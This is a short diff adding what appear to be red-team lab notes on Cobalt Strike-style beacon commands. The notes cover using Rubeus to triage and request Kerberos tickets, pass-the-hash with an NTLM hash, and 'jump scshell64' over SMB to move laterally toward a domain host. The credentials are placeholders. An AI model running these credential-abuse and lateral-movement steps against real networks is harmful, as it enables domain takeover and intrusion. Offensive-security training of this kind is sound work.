@@ -1,0 +1,8 @@
+need to impersonate domain admin then move laterally to lon-ca-1??
+    let's try
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes_key> /nowrap
+        if no ticket, try dumping hashes?
+            beacon> pth <domain>\<user> <NTLM>
+
+        beacon> jump scshell64 lon-cs-1 smb
